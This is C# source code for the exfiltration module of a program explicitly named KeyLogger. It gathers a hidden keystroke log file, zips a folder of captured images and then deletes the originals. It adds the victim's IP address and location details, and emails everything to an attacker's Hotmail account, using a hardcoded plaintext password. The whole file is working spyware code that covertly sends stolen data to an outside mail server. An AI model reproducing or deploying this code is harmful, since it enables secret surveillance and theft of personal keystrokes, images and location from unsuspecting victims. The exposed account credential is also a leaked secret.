using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger
{
    using System.IO;
    using System.IO.Compression;
    using System.Net.Mail;

    class Mail
    {
        private IpInfo ipInfo = new IpInfo();
        public void SendMail()
        {
            String newFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            string filepath = newFilePath + @"\TKH\";
            if (!Directory.Exists(filepath))
                return;

            string newFilePath2 = newFilePath + @"\TKH\DC.text";

            DateTime dateTime = DateTime.Now;
            string subtext = "Loggedfiles";
            subtext += " [" + dateTime + "]";

            SmtpClient client = new SmtpClient("smtp.live.com", 587); //hotmail server
            MailMessage logMessage = new MailMessage();
            logMessage.From = new MailAddress("ianlogger@hotmail.com"); //from
            logMessage.To.Add("ianlogger@hotmail.com"); // destination
            logMessage.Subject = subtext;

            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials =
                new System.Net.NetworkCredential("ianlogger@hotmail.com", "Semkle1307!"); //email details

            string newFile = string.Empty;
            if(File.Exists(newFilePath2))
                newFile = File.ReadAllText(newFilePath2); // read log file and create new copy

            if (newFile == string.Empty)
                return;

            string attachmentTextFile = newFilePath + @"\TKH\PNT.text"; // name new copy
            File.WriteAllText(attachmentTextFile, newFile);
            logMessage.Attachments.Add(new Attachment(attachmentTextFile));

            string imagePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (Directory.Exists(imagePath + @"\TKH\QS\"))
            {
                if (File.Exists(imagePath + @"\TKH\Pack.zip"))
                    File.Delete(imagePath + @"\TKH\Pack.zip");

                ZipFile.CreateFromDirectory(imagePath + @"\TKH\QS\", imagePath + @"\TKH\Pack.zip");
                logMessage.Attachments.Add(new Attachment(imagePath + @"\TKH\Pack.zip"));

                DirectoryInfo directory = new DirectoryInfo(imagePath + @"\TKH\QS\");

                foreach (FileInfo file in directory.GetFiles())
                {
                    file.Delete();
                }

                directory.Delete();
            }

            string bodyText = "Date: " + DateTime.Now;
            bodyText += "\n" + "UserIP: " + this.ipInfo.GetIpAdress(); //add IP
            bodyText += "\n" + this.ipInfo.GetIpInfo(this.ipInfo.GetIpAdress());
            logMessage.Body = bodyText;
            client.Send(logMessage);
            logMessage = null;
        }
    }
}
